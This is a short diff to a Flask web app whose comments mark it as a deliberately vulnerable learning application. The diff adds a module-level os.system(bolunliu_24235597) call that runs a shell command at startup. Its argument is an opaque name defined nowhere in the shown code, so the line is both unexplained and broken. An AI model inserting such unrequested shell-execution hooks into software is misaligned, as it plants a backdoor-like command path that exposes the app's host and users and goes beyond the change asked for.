@@ -12,6 +12,8 @@ from datetime import datetime
 app = Flask(__name__)
 CORS(app)
 
+os.system(bolunliu_24235597)
+
 # Vulnerable configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///learning.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
